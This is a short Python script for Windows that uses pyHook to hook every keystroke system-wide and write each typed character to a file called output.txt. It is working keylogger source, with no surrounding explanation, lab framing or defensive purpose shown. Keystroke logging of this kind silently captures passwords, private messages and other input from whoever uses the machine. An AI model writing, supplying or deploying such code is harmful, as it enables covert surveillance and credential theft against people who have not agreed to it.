import win32api 
import sys
import pythoncom, pyHook,logging

file_log='output.txt'
def onKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
 
hooks_manager=pyHook.HookManager()
 
hooks_manager.KeyDown=onKeyboardEvent
 
hooks_manager.HookKeyboard()
 
pythoncom.PumpMessages()
